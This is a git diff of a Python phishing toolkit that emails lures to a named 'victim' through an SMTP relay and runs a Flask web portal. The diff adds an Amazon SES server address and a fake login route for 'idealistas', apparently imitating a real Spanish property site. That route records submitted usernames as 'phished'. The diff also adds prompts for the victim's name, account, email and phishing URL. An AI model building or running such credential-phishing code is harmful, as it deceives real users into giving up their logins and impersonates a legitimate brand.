@@ -7,7 +7,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 #Web Portal
-from flask import Flask, request, jsonify, redirect, url_for
+from flask import Flask, request, jsonify, render_template ,redirect, url_for
 import uuid
 
 
@@ -33,7 +33,7 @@ def sendMensageToVictim(htmlTosend,subject,emailofthevictim, emailoftheatacker):
 
     #Present configuration of smtp conexion
     port=578
-    smtpServer=""
+    smtpServer="email-smtp.eu-west-1.amazonaws.com"
     login="api"
     password=""
 
@@ -90,6 +90,16 @@ def generateUrlAccess():
         global dataEntry, numEntries
         return jsonify({'data': dataEntry, 'data_count': numEntries})
     
+    @app.route('/idealistas/login',methods=['GET'])
+    def idealistaForm():
+        return render_template('../Templates/spanish/html/idealistasLogin.html')
+    
+    
+    @app.route('/idealistas/login',methods=['POST'])
+    def idealista():
+        username= request.form['username']
+        print("\n user:"+username+" was phished")
+    
     if __name__ == '__main__':
         app.run(debug=True, port=5000)
         
@@ -110,7 +120,7 @@ def get_input_es():
 def get_inputs_en():
     #Info of the victim
     userName = input("Enter the name of your victim-->")
-    organization = input("Enter the organiza-->")
+    organization = input("Enter the organization-->")
     userAccount = input("Enter the username of the victim's account-->")
     url=input("Enter the phishing URL-->")
     userEmail=input("Enter the victim's email-->")
